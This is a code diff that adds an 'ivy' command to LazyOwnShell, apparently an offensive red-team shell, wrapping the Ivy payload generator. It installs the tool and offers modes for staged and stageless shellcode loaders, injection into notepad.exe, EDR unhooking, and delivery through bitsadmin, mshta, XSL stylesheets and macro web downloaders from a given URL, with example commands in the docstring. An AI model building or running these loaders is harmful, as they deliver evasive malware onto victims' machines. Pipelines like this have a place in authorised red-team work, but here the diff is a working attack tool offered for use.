@@ -10085,6 +10085,106 @@ class LazyOwnShell(Cmd):
         
         return
 
+    def do_ivy(self, line):
+        """
+        Generates payloads using Ivy with various options.
+
+        This function checks if `Ivy` is installed and installs it if necessary. It then runs `Ivy`
+        with the specified parameters to create various payloads.
+
+        :param line: Not used in this implementation but reserved for future use.
+
+        :returns: None
+
+        Manual execution:
+        To manually generate a payload using Ivy, use the following command:
+            ./Ivy <OPTIONS>
+
+        Replace the placeholders with the desired values. For example:
+            ./Ivy -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
+            ./Ivy -stageless -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -process64 C:\\windows\\system32\\notepad.exe -process32 C:\\windows\\SysWOW64\\notepad.exe -O stageless.js
+
+        Example usage:
+            ivy staged_inject -Ix64 test64.vba -Ix86 test32.vba -P Inject -O SampleInject.js
+            ivy stageless_local -Ix64 stageless64.bin -Ix86 stageless32.bin -P Local -O stageless.js
+            ivy one_liner -Ix64 stageless64.bin -Ix86 stageless32.bin -P Inject -O test.png -stageless
+        """
+        
+        # Check if Ivy is installed
+        if not is_binary_present("Ivy"):
+            print_warn(f"Ivy is not installed. Installing Ivy... to download option {GREEN}50")
+            p.onecmd("download_external")
+            os.system("go get github.com/fatih/color")
+            os.system("go get github.com/KyleBanks/XOREncryption/Go")
+            os.system("go build Ivy.go")
+        
+        # Define options for different payload types
+        options = {
+            "staged_inject": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
+            },
+            "staged_local": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
+            },
+            "stageless_local": {
+                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file}"
+            },
+            "stageless_inject": {
+                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file}"
+            },
+            "stageless_inject_process": {
+                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -process64 {process64} -process32 {process32} -O sessions/{output_file}"
+            },
+            "unhooked_stageless_local": {
+                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Local -unhook -O sessions/{output_file}"
+            },
+            "unhooked_stageless_inject": {
+                "cmd": "Ivy -stageless -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -unhook -O sessions/{output_file}"
+            },
+            "one_liner_non_executable": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Inject -O sessions/{output_file} -stageless"
+            },
+            "bitsadmin_command": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery bits -stageless"
+            },
+            "mshta_command": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery hta -stageless"
+            },
+            "stylesheet_payload": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery xsl -stageless"
+            },
+            "macro_web_downloader": {
+                "cmd": "Ivy -Ix64 {x64_file} -Ix86 {x86_file} -P Local -O sessions/{output_file} -url {url} -delivery macro -stageless"
+            }
+        }
+        
+        # User input for selecting payload type and parameters
+        print_warn("Select the payload type:")
+        for i, option in enumerate(options.keys(), start=1):
+            print_msg(f"{i}. {option.replace('_', ' ').title()}")
+
+        type_choice = int(input("Enter the number corresponding to the payload type: ")) - 1
+        if type_choice < 0 or type_choice >= len(options):
+            print_error("Invalid choice. Please select a valid number.")
+            return
+
+        selected_type = list(options.keys())[type_choice]
+
+        params = {
+            "x64_file": "stageless64.bin",
+            "x86_file": "stageless32.bin",
+            "output_file": input("Enter the Name of the payload (payload.txt): "),
+            "process64": input("Enter 64-bit process path (optional): "),
+            "process32": input("Enter 32-bit process path (optional): "),
+            "url": input("Enter URL (optional): ")
+        }
+
+        ivy_command = options[selected_type]["cmd"].format(**params)
+
+        print_msg(f"Generating payload with Ivy: {ivy_command}")
+        os.system(ivy_command)
+        
+        return
 
 if __name__ == "__main__":
     p = LazyOwnShell()
